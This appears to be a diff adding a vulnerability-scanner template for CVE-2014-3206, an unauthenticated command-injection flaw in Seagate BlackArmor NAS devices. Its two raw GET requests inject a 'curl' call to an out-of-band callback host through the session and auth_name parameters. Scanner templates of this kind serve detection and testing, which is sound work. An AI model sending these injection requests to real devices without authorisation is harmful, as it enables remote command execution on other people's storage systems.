@@ -1,0 +1,49 @@
+id: seagate-blackarmor-nas-cmd-exec
+info:
+  name: Seagate BlackArmor NAS Unauthenticated Command Execution (CVE-2014-3206)
+  author: ProjectDiscoveryAI
+  severity: critical
+  description: |
+    Seagate BlackArmor NAS is a network storage server that has a vulnerability allowing unauthenticated command execution. Exploiting this flaw, a remote attacker could execute arbitrary commands via specific parameters in targeted URLs.
+  reference:
+    - https://packetstormsecurity.com/files/163523/Seagate-BlackArmor-NAS-sg2000-2000.1331-Command-Injection.html
+  classification:
+    cve-id: CVE-2014-3206
+    cvss-score: 9.8
+http:
+  - raw:
+      - |
+        GET /backupmgt/localJob.php?session=fail;curl+{{interactsh-url}}%00 HTTP/1.1
+        Host: {{Hostname}}
+    stop-at-first-match: true
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "curl"
+        part: body
+      - type: word
+        words:
+          - "session=fail"
+        part: body
+  - raw:
+      - |
+        GET /backupmgmt/pre_connect_check.php?auth_name=fail;curl+{{interactsh-url}}%00 HTTP/1.1
+        Host: {{Hostname}}
+    stop-at-first-match: true
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "curl"
+        part: body
+      - type: word
+        words:
+          - "auth_name=fail"
+        part: body
